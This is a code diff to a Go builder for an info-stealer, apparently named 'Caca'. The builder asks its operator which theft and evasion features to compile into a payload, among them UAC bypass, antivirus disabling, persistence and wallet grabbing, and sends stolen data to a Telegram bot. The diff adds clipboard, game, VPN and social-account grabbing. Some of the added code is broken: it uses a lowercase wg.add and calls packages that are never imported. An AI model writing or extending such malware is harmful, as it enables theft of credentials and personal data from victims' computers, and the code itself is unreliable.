@@ -18,6 +18,10 @@ type Config struct {
 	EnableFakeError     bool
 	EnableBrowsers      bool
 	HideConsole         bool
+	EnableClipboard     bool
+	EnableGames         bool
+	EnableVpns          bool
+	EnableSocials       bool
 	EnableUacBypass     bool
 	DisableAntiVirus    bool
 	DisableFactoryReset bool
@@ -68,6 +72,10 @@ import (
 	"Caca/core/telegram"
 	"Caca/core/uac"
 	"Caca/core/antivirus"
+	"Caca/core/games"
+	"Caca/core/vpn"
+	"Caca/pkg/utils/hardware"
+	"Caca/core/clipboard"
     "os"
 	"os/exec"
 	"fmt"
@@ -177,6 +185,17 @@ func main() {
 		fmt.Println("Anti-debugging and VM analysis not enabled")
 	}
 
+	if {{.EnableClipboard}} {
+	
+	    wg.Add(1)
+		go func() {
+            defer wg.Done()
+            clipboard.Clipboard(TelegramBotToken, TelegramChatId)
+        }()
+	} else {
+	 fmt.Println("Clipboard not enabled")
+    }
+
 	if {{.EnableUacBypass}} {
 	    wg.Add(1)
         go func() {
@@ -187,6 +206,26 @@ func main() {
 	 fmt.Println("UAC bypass not enabled")
     }
 
+	if {{.EnableVpns}} {
+	     wg.add(1)
+		 go func() {
+            defer wg.Done()
+            vpn.Run()
+        }()
+	} else {
+	 fmt.Println("VPNs not enabled")
+    }
+
+	if {{.EnableSocials}} {
+	      wg.add(1)
+          go func() {
+		  defer wg.Done()
+		  Socials.Run()
+        }()
+    } else {
+	 fmt.Println("Socials not enabled")
+	}
+
 	if {{.DisableAntiVirus}} {
 	    wg.Add(1)
         go func() {
@@ -195,6 +234,16 @@ func main() {
         }()
 	} else {
 	 fmt.Println("Anti-Virus bypass not enabled")
+    }
+
+	if {{.EnableGames}} {
+	   wg.add(1)
+	   go func() {
+            defer wg.Done()
+            Games.Run()
+        }()
+	} else {
+	 fmt.Println("Games not enabled")
     }
 
 	if {{.EnableFakeError}} {
@@ -305,6 +354,10 @@ func main() {
 		"RandomKeyVar":        randomKeyVar,
 		"HideConsole":         cfg.HideConsole,
 		"EnableAntiDebug":     cfg.EnableAntiDebug,
+		"EnableClipboard":     cfg.EnableClipboard,
+		"EnableGames":         cfg.EnableGames,
+		"EnableVpns":          cfg.EnableVpns,
+		"EnableSocials":       cfg.EnableSocials,
 		"EnableUacBypass":     cfg.EnableUacBypass,
 		"DisableAntiVirus":    cfg.DisableAntiVirus,
 		"EnableFakeError":     cfg.EnableFakeError,
@@ -349,7 +402,7 @@ func main() {
 	var teleChatID string
 	fmt.Scanln(&teleChatID)
 
-	var enableAntiDebug, enableFakeError, enableUacBypass, disableAntiVirus, enableBrowsers, hideConsole, disableFactoryReset, disableTaskManager, enablePersistence, enableCryptoWallets bool
+	var enableAntiDebug, enableFakeError, enableClipboard, enableSocials, enableVpns, enableGames, enableUacBypass, disableAntiVirus, enableBrowsers, hideConsole, disableFactoryReset, disableTaskManager, enablePersistence, enableCryptoWallets bool
 
 	fmt.Println(cyan("Enable Anti-Debugging? (yes/no):"))
 	var input string
@@ -363,6 +416,23 @@ func main() {
 	fmt.Println(cyan("Disable Anti-Virus? (yes/no):"))
 	fmt.Scanln(&input)
 	disableAntiVirus = input == "yes"
+
+	fmt.Println(cyan("Enable Games Info Grabbing? (yes/no):"))
+	fmt.Scanln(&input)
+	enableGames = input == "yes"
+
+	fmt.Println(cyan("Enable VPNs Info Grabbing? (yes/no):"))
+	fmt.Scanln(&input)
+	enableVpns = input == "yes"
+
+	fmt.Println(cyan("Enable Socials Info Grabbing? (yes/no):"))
+	fmt.Scanln(&input)
+	enableSocials = input == "yes"
+
+	fmt.Println(cyan("Enable Clipboard Grabbing? (yes/no):"))
+	fmt.Scanln(&input)
+	enableClipboard = input == "yes"
+
 
 	fmt.Println(cyan("Enable Fake Error? (yes/no):"))
 	fmt.Scanln(&input)
@@ -402,6 +472,10 @@ func main() {
 		EnableBrowsers:      enableBrowsers,
 		HideConsole:         hideConsole,
 		EnableUacBypass:     enableUacBypass,
+		EnableGames:         enableGames,
+		EnableClipboard:     enableClipboard,
+		EnableVpns:          enableVpns,
+		EnableSocials:       enableSocials,
 		DisableAntiVirus:    disableAntiVirus,
 		DisableFactoryReset: disableFactoryReset,
 		DisableTaskManager:  disableTaskManager,
